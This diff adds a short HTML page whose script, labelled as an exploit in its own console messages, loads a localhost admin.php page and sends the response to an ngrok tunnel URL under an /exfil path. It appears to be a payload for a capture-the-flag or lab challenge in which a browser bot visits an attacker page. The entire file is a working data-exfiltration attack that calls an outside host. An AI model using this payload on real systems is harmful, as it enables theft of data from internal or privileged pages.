@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+  </head>
+  <body>
+    <p id="stuff"></p>
+    <script>
+    console.log('Starting exploit');
+    try {
+        var xhttp = new XMLHttpRequest();
+        console.log('Opening admin.php');
+        xhttp.open("GET", "http://localhost:20070/admin.php", false);
+        xhttp.send();
+        console.log('Response received:', xhttp.responseText.substring(0, 100));
+
+        var xhttp2 = new XMLHttpRequest();
+        console.log('Exfiltrating data');
+        xhttp2.open("GET", "https://[link].ngrok-free.dev/exfil?data=" + encodeURIComponent(xhttp.responseText), false);
+        xhttp2.send();
+        console.log('Exfiltration complete');
+    } catch(e) {
+        console.error('Error:', e);
+    }
+    </script>
+  </body>
+</html>
